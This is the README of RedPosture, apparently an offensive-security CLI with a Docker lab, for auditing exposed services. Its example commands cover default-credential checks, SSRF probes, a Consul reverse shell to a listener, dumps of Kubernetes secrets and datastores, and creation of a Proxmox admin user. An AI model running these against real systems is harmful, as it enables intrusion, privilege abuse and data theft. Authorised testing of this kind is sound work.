# RedPosture

RedPosture is a Python security CLI for:

- exporter discovery / trigger / collect workflows (`exporters`)
- service exposure auditing (`registry`, `grafana`, `proxmox`, `gitlab`, `consul`, `qdrant`, `kubeapi`, `postgres`, `clickhouse`, `redis`, `etcd`, `kafka`, `zookeeper`, `elastic`)
- listener-based callback capture for lab SSRF workflows

Use only on systems you own or are explicitly authorized to assess.

## Install

Recommended (`pipx`):

```bash
pipx install "git+https://github.com/MelForze/Redposture.git"
```

Local editable install:

```bash
python -m pip install -e .
```

Python: `3.10+` (project tooling is tested on `3.10-3.13`).

## Quick Help

```bash
redposture --help
redposture exporters -h
redposture registry -h
redposture grafana -h
redposture proxmox -h
redposture gitlab -h
redposture consul -h
redposture kubeapi -h
redposture postgres -h
redposture clickhouse -h
redposture redis -h
redposture etcd -h
redposture qdrant -h
redposture kafka -h
redposture zookeeper -h
redposture elastic -h
```

Common flags (most modules):

- `-d, --debug` verbose diagnostics
- `-log <file>` tee output to file
- `-o <file>` save output
- `-f txt|json` output format (`txt` default)

## Docker Lab (Local Testing)

Start lab:

```bash
docker compose -f docker-compose.lab.yml up -d --build
```

## Examples

### Exporters

```bash
# Scan
redposture exporters scan -t 127.0.0.1

# Collect
redposture exporters collect -t 127.0.0.1 --deep

# Resume collect with checkpoint (skip already processed endpoint jobs)
redposture exporters collect -t 127.0.0.1 --checkpoint-file /tmp/rp_collect.ckpt
redposture exporters collect -t 127.0.0.1 --checkpoint-file /tmp/rp_collect.ckpt --resume

# Throughput tuning
redposture exporters collect -t 127.0.0.1 --max-inflight 512 --no-adaptive-collect

# Trigger (listener mode)
redposture exporters trigger -t 127.0.0.1 --callback-dns host.docker.internal --with-listen

# Trigger on custom exporter ports
redposture exporters trigger -t 127.0.0.1 --callback-ip 127.0.0.1 -p 19121,19308 --with-listen
```

Default exporter discovery/collect ports include:
`7777,9100,9101,9102,9104,9113,9114,9115,9116,9117,9119,9121,9127,9128,9131,9150,9182,9187,9216,9221,9256,9290,9308,9342,9349,9399,9419,9427`.

Note:
- `snmp_exporter` default is `9117`; `clickhouse_exporter` is `9116`.
- Canonical defaults include overlap pairs (`node_exporter/haproxy_exporter` on `9101`, `snmp_exporter/apache_exporter` on `9117`); scan classification is content-based, not port-only.
- In the lab compose these conflict exporters are exposed on special ports to avoid collisions: `haproxy_exporter -> 19101`, `apache_exporter -> 19119`.

```bash
# Expanded lab matrix (standard + special + mirrors)
redposture exporters scan -t 127.0.0.1 -p 7777,9100,9102,9104,9113,9114,9116,9117,9119,9121,9127,9128,9131,9150,9182,9187,9216,9221,9256,9290,9308,9342,9349,9399,9419,9427,19101,19119,17777,19100,19102,19104,19113,19114,19115,19117,19121,19128,19131,19150,19182,19187,19219,19221,19290,19308,19399,19419

# Expanded collect with deep endpoints + raw responses
redposture exporters collect -t 127.0.0.1 -p 7777,9100,9102,9104,9113,9114,9116,9117,9119,9121,9127,9128,9131,9150,9182,9187,9216,9221,9256,9290,9308,9342,9349,9399,9419,9427,19101,19119,17777,19100,19102,19104,19113,19114,19115,19117,19121,19128,19131,19150,19182,19187,19219,19221,19290,19308,19399,19419 --deep --save-responses-dir /tmp/rp_collect_raw
```

### Registry

```bash
# Baseline detect
redposture registry -t 127.0.0.1 --port 15000

# Docker/OCI catalog
redposture registry -t 127.0.0.1 --port 15000 --docker --images

# Tag metadata
redposture registry -t 127.0.0.1 --port 15000 --docker --repository redposture/demo-api --tag latest --metadata
```

### Grafana

```bash
# Baseline
redposture grafana -t 127.0.0.1

# Default creds check
redposture grafana -t 127.0.0.1 --defcreds

# Datasources
redposture grafana -t 127.0.0.1 --defcreds --show-datasources
```

`--defcreds` behavior:

- always checks both default pairs in deterministic order: `admin:admin` then `admin:prom-operator`
- prints per-credential result lines in `txt` output

### GitLab

```bash
# Baseline (lab mock)
redposture gitlab -t 127.0.0.1 --port 18080

# Token check
redposture gitlab -t 127.0.0.1 --port 18080 --token glpat-redposture-lab-analyst-2026

# Clone example
redposture gitlab -t 127.0.0.1 --port 18080 --token glpat-redposture-lab-root-2026 --project redposture-lab/public-api --clone
```

### Consul

```bash
# Сбор / dump
redposture consul -t 127.0.0.1 --dump

# SSRF
redposture consul -t 127.0.0.1 --ssrf-target 127.0.0.1 --ssrf-port 3000,9115 --ssrf-path /debug/vars

# Revshell (controlled lab only)
redposture consul -t 127.0.0.1 --revshell --lhost host.docker.internal --lport 4444 --listen
```

### Kubernetes API (`kubeapi`)

```bash
# Lab no-auth proxy (real k3s behind proxy)
redposture kubeapi -t 127.0.0.1 --port 26443 --namespaces --pods

# Auditor token (auth-required endpoint)
redposture kubeapi -t 127.0.0.1 --port 16443 --insecure --token "$(grep '^KUBEAPI_AUDITOR_TOKEN=' docker/kubeapi/output/kubeapi_tokens.env | cut -d= -f2-)" --namespaces --pods

# Admin token (secrets)
redposture kubeapi -t 127.0.0.1 --port 16443 --insecure --token "$(grep '^KUBEAPI_ADMIN_TOKEN=' docker/kubeapi/output/kubeapi_tokens.env | cut -d= -f2-)" --secrets
```

### Postgres

```bash
# Baseline
redposture postgres -t 127.0.0.1

# Default creds check
redposture postgres -t 127.0.0.1 --defcreds

# Basic enum
redposture postgres -t 127.0.0.1 -u postgres -p postgres --show-databases
```

### ClickHouse

```bash
# Baseline (native protocol)
redposture clickhouse -t 127.0.0.1

# HTTP/HTTPS API mode
redposture clickhouse -t 127.0.0.1 --http

# Default creds check (always checks default:<empty> and default:default)
redposture clickhouse -t 127.0.0.1 --defcreds

# SQL query + table dump
redposture clickhouse -t 127.0.0.1 --sql-cmd "SELECT version()" --table audit.events --dump
```

### Redis

```bash
# Baseline
redposture redis -t 127.0.0.1

# Keys
redposture redis -t 127.0.0.1 --show-keys

# Dump
redposture redis -t 127.0.0.1 --dump
```

### etcd

```bash
# Baseline
redposture etcd -t 127.0.0.1

# Keys
redposture etcd -t 127.0.0.1 --show-keys

# Dump
redposture etcd -t 127.0.0.1 --dump
```

### Proxmox

```bash
# Lab mock (docker-compose.lab.yml service: proxmox-mock)
redposture proxmox -t 127.0.0.1 --port 18006 --insecure --pveapitoken 'audit@pve!redposture=pve-redposture-token-2026' --nodes --users

# Create user (admin token required, password is auto-generated, role Administrator on / is granted)
redposture proxmox -t 127.0.0.1 --port 18006 --insecure --pveapitoken 'admin@pve!root=pve-redposture-admin-2026' -add-user redposture_bot --users
```

### Qdrant

```bash
# Baseline (anonymous collections access; GHSA /logger probe summary, debug shows details)
redposture qdrant -t 127.0.0.1 --port 6333

# Collections list + full collection info dump
redposture qdrant -t 127.0.0.1 --collections --dump

# SSRF via snapshot recover + local capture listener (Docker lab: use host.docker.internal)
redposture qdrant -t 127.0.0.1 --collection demo_vectors --ssrf-target host.docker.internal --ssrf-port 18081 --ssrf-path /probe --listen
```

### Kafka

```bash
# Baseline
redposture kafka -t 127.0.0.1

# Topics
redposture kafka -t 127.0.0.1 --show-topics

# Topic dump
redposture kafka -t 127.0.0.1 --topic audit.logs --dump
```

### Elastic

```bash
# Baseline
redposture elastic -t 127.0.0.1 --port 19200

# Endpoints + cluster + users + discover (API key auth)
redposture elastic -t 127.0.0.1 --port 19201 --apitoken ZXM6bGFiLXRva2Vu --endpoints --cluster --user --discover

# Plugins list
redposture elastic -t 127.0.0.1 --port 19200 --plugins

# Basic auth
redposture elastic -t 127.0.0.1 --port 19201 -u elastic -p 'ElasticRead!2026' --cluster
```

### ZooKeeper

```bash
# Baseline
redposture zookeeper -t 127.0.0.1

# Znodes
redposture zookeeper -t 127.0.0.1 --show-znodes

# Dump
redposture zookeeper -t 127.0.0.1 --dump
```

## Development (Optional)

Quick local checks:

```bash
tox
```

Or with a local venv:

```bash
python3 -m venv .venv
./.venv/bin/python -m pip install -e '.[dev]'
./.venv/bin/python -m pytest -q
./.venv/bin/python -m ruff check .
```

## Notes

- `txt` output is terminal-oriented; use `-f json` for parsing.
- Use `-h` on each module for full flag dependencies and edge-case behavior.
